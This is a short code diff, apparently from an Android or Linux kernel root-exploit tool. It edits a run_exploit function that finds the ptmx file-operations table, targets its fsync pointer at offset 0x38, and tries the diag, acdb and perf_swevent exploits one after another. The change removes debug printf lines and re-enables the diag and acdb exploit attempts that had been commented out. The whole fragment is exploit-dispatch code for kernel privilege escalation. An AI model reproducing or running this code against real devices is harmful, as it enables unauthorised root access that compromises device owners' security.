@@ -66,23 +66,19 @@ run_exploit(void)
 {
   unsigned long int ptmx_fsync_address;
   unsigned long int ptmx_fops_address;
-  printf("Inside runExploit <1>\n");
   ptmx_fops_address = get_ptmx_fops_address();
-  printf("Inside runExploit <2>\n");
   if (!ptmx_fops_address) {
     return false;
   }
-	printf("Inside runExploit <3>\n");
   ptmx_fsync_address = ptmx_fops_address + 0x38;
- /* if (attempt_diag_exploit(ptmx_fsync_address)) {
+  if (attempt_diag_exploit(ptmx_fsync_address)) {
     return true;
-  } */
-  printf("Inside runExploit\n");
-
- /* printf("Attempt acdb exploit...\n");
+  }
+  
+  printf("Attempt acdb exploit...\n");
   if (attempt_acdb_exploit(ptmx_fsync_address, 0)) {
     return true;
-  } */
+  }
   printf("\n");
 
   printf("Attempt perf_swevent exploit...\n");
